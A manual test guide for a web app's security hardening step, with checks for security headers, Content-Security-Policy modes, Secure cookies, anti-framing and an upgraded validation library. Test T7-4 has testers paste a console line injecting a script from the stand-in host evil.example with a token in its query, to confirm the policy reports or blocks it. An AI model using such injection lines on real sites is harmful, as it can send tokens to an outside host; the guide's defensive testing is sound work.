# Phase 7: security hardening (step 7.6)

[← All test guides](README.md)

Phase 7 makes the app harder to attack, without changing what users see. So far it has done step 7.6:

- **Security headers** on every page and file. They tell the browser:
  - not to guess file types;
  - not to pass full addresses to other sites;
  - not to let another site show the app inside a frame;
  - not to let pages use the camera, microphone, location or payment features.
- **A Content-Security-Policy (CSP):** the list of places a page may load scripts, styles, fonts and frames from. The setting `SecurityHeaders:ContentSecurityPolicy` has three modes:
  - **ReportOnly** (the default): the browser blocks nothing, but reports what it *would* block;
  - **Enforce**: the browser blocks it;
  - **Off**: no policy.
- **jQuery Validation 1.22.1** on the sign-in and password pages (was 1.17.0 / 1.19.5, which had known issues).
- **The anti-forgery cookie** (sent with every form) is marked Secure, so it only travels over https.

Background and the scan results: `docs/multitenancy/security-review.md`.

**These tests need the `mt/phase7` branch.** It isn't merged into `mt/integration` yet. In the repository folder:

```powershell
git checkout mt/phase7
dotnet run --project InpremClockingApp --launch-profile https
```

Stop the app first if it is running (Ctrl+C in its terminal).

**The browser's developer tools** are used throughout. The steps are for **Chrome or Edge**:
- **F12** opens them. **Network**, **Console** and **Application** are tabs along their top.
- In **Network**, reload the page (**Ctrl+R**) to see its requests. Click one, and in **Headers** scroll to **Response Headers**.

---

## T7-1 The pages carry the security headers

**Use case:** every answer from the app tells the browser how to protect the visitor.

1. Open `https://localhost:7078/Identity/Account/Login`. Press **F12**, click **Network**, press **Ctrl+R**.
2. Click the first row, **Login**. Under **Headers**, scroll to **Response Headers**.
3. Click the row for **site.css** (a file, not a page) and look again.
4. Open `https://localhost:7078/Provider/Login` and do the same for the **Login** row.

**Expected:**
- Steps 2 and 3 show:
  - `content-security-policy-report-only: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com …`;
  - `x-content-type-options: nosniff`;
  - `x-frame-options: SAMEORIGIN`;
  - `referrer-policy: strict-origin-when-cross-origin`;
  - `permissions-policy: camera=(), microphone=(), geolocation=(), payment=()`.
- Step 4 shows the same, except `referrer-policy: no-referrer`. The console is stricter, because its links carry one-time codes.
- There is **no** `content-security-policy` header (without "-report-only"): the default mode only reports.

## T7-2 In report-only mode, nothing changes

**Use case:** the new policy must not break anything people use every day.

Keep **F12** open on the **Console** tab the whole time. Then do your usual work:

1. Sign in as an organization admin (README, "Getting around the app").
2. Kiosk: on **Volunteer Clocking**, clock someone in, start and end a break, clock out (as in T0-5).
3. Back office (`/BackOffice`):
   - open **Dashboard**;
   - in **Manage Staff**, click **Add New**, fill the form, save;
   - in **Reports**, open **Staff Clocking** and download a PDF and an Excel file.
4. As the owner: **Billing**, **Staff alerts**.
5. The console (`/Provider`): **Organizations** → an organization → each tab; **Plans**; **Jobs**.
6. The demo website (`/demo-site`): **Pricing**, then **Register your organization**: the CAPTCHA box appears.
7. The API docs page (`/api/public/docs`): **GET /api/public/v1/plans** → **Try it out** → **Execute**.

**Expected:**
- Everything works exactly as before.
- The **Console** tab shows no message containing "Content Security Policy". (Messages naming `chrome-extension://` come from your browser's extensions: ignore them.)
- The app's terminal shows no line starting with `Content-Security-Policy report:`.

## T7-3 Enforce mode: still nothing breaks

**Use case:** before the live site enforces the policy, check that blocking would hit nothing the app needs.

1. Stop the app (Ctrl+C). Run:
   ```powershell
   dotnet user-secrets set SecurityHeaders:ContentSecurityPolicy Enforce --project InpremClockingApp
   ```
   Start the app again.
2. Repeat T7-1 step 2: the header is now `content-security-policy` (without "-report-only").
3. Repeat T7-2 steps 1 to 7.
4. Switch back: stop the app, run
   ```powershell
   dotnet user-secrets set SecurityHeaders:ContentSecurityPolicy ReportOnly --project InpremClockingApp
   ```
   and start it again.

**Expected:** in step 3, everything works, with no "Content Security Policy" message in the **Console** tab and no report in the terminal. If anything breaks, note the page and the exact console message: that page needs something the policy doesn't allow.

## T7-4 A script from another site is reported (or blocked)

**Use case:** if someone managed to slip a foreign script into a page, the browser refuses it and the app hears about it.

1. Open `https://localhost:7078/Identity/Account/Login`, **F12**, **Console** tab.
2. Click in the console and paste:
   ```javascript
   const s = document.createElement('script'); s.src = 'https://evil.example/x.js?token=SECRET'; document.head.appendChild(s);
   ```
   Press **Enter**. Chrome may first refuse to paste and ask you to type `allow pasting`: type it, press Enter, then paste again.
3. Look at the app's terminal.
4. Optional: repeat with the policy on **Enforce** (T7-3 step 1), then switch back to **ReportOnly**.

**Expected:**
- Step 2: the console says `[Report Only] Refused to load the script 'https://evil.example/x.js?token=SECRET' because it violates the following Content Security Policy directive: "script-src …"`.
- Step 3: a few seconds later the terminal shows a warning:

  ```
  Content-Security-Policy report: script-src-elem blocked https://evil.example/x.js on https://localhost:7078/Identity/Account/Login.
  ```

  The `?token=SECRET` part is **not** in the log. Addresses lose their query, which can hold tokens.
- Step 4: the message starts with `Refused to load the script` (no "[Report Only]"), and nothing is requested from `evil.example`.

## T7-5 Sign-in checks empty fields (jQuery Validation 1.22.1)

**Use case:** the sign-in and password pages still check the form in the browser, now with the updated library.

1. Open `https://localhost:7078/Identity/Account/Login`, **F12**, **Network** tab, **Ctrl+R**.
2. In the Network filter box, type `validate`.
3. Leave **Email** and **Password** empty, click **Log in**.
4. Type an email and a wrong password, click **Log in**.
5. Click **Forgot your password?**, leave **Email** empty, click **Send Reset Link**.

**Expected:**
- Step 2:
  - `jquery.validate.js` is listed, from `/vendor/jquery-validation/1.22.1/`;
  - nothing comes from `/Identity/lib/jquery-validation/`, and nothing names `1.17.0`.
  - On the test or live site (not Development), it comes from `cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.22.1/` instead.
- Step 3: nothing seems to happen, and that is right. The empty form is checked in the browser and **not** sent: Network shows no new **Login** row with method POST. The original page shows no message for empty boxes; it behaved this way before too.
- Step 4: the usual "Invalid login attempt." message.
- Step 5: the same: the form is not sent.

## T7-6 Cookies only travel over https

**Use case:** the cookies that keep you signed in and protect forms are never sent unencrypted.

1. Open `https://localhost:7078/Identity/Account/Login` and sign in as any admin.
2. **F12** → **Application** tab → in the left column, **Storage** → **Cookies** → `https://localhost:7078`.
3. Look at the **Secure** and **HttpOnly** columns.

**Expected:**
- `.AspNetCore.Antiforgery.…` has **Secure** ✓ and **HttpOnly** ✓ (Secure is new).
- `.Inprem.App` (the sign-in cookie) has **Secure** ✓ and **HttpOnly** ✓, as before.

## T7-7 Other sites can't show the app in a frame

**Use case:** a fake site must not be able to show the real sign-in page inside its own page and trick people into clicking (click-jacking).

1. Open **Notepad** and paste:
   ```html
   <html><body><h1>Another site</h1>
   <iframe src="https://localhost:7078/Identity/Account/Login" width="600" height="400"></iframe>
   </body></html>
   ```
2. **File** → **Save as**: **Save as type** "All files", name `frame-test.html`, on the Desktop.
3. Double-click `frame-test.html` to open it in the browser.

**Expected:** "Another site" is shown, but the frame is empty or says **localhost refused to connect**. The **Console** tab names `frame-ancestors` or `X-Frame-Options`. Delete the file afterwards.

## T7-8 A wrong setting stops the app at start-up

**Use case:** a typo in the setting must be noticed at once, not leave the site silently unprotected.

1. Stop the app. Run:
   ```powershell
   dotnet user-secrets set SecurityHeaders:ContentSecurityPolicy Sometimes --project InpremClockingApp
   ```
2. Start the app.
3. Set it back and start again:
   ```powershell
   dotnet user-secrets set SecurityHeaders:ContentSecurityPolicy ReportOnly --project InpremClockingApp
   ```

**Expected:** step 2 stops with an error naming `SecurityHeaders:ContentSecurityPolicy` (the value "Sometimes" is not `Off`, `ReportOnly` or `Enforce`). After step 3 the app starts normally.

## T7-9 The automated checks (developer)

**Use case:** the checks behind this step run on every change, and can be repeated by hand.

1. Run all the suites (README, "Before you start", or `docs/multitenancy/HANDOVER.md` section 5.1). These are the new Phase 7 tests:

   | Test | What it checks |
   |---|---|
   | `SecurityHeadersTests` (Integration) | The headers on every kind of answer and both sites; the three modes; the report address; the Secure cookie; jQuery Validation 1.22.1 |
   | `ContentSecurityPolicyBrowserTests` (UI) | A real browser opens every owner, console and signed-out page with the policy enforced: nothing blocked. The empty sign-in form is checked |
   | `CrossOrganizationReadTests` (Architecture) | Every read past the organization filters was reviewed; a new one fails until reviewed |
   | `LogScrubbingTests` (Integration) | No password, token, code, full email, phone number or payload in the logs |

   **All browser tests now run with the policy enforced.**
2. Optional, with Docker Desktop running and the app started: the ZAP scan (`security-review.md` section 4).

**Expected:** every suite passes (962 tests on 2026-10-22). The ZAP scan reports 0 high findings.

---

## Results

| Test | What it checks | Result | Notes |
|---|---|---|---|
| T7-1 | The pages carry the security headers | | |
| T7-2 | Report-only mode changes nothing | | |
| T7-3 | Enforce mode: still nothing breaks | | |
| T7-4 | A script from another site is reported or blocked | | |
| T7-5 | Sign-in checks empty fields (1.22.1) | | |
| T7-6 | Cookies only travel over https | | |
| T7-7 | Other sites can't show the app in a frame | | |
| T7-8 | A wrong setting stops the app at start-up | | |
| T7-9 | The automated checks | | |
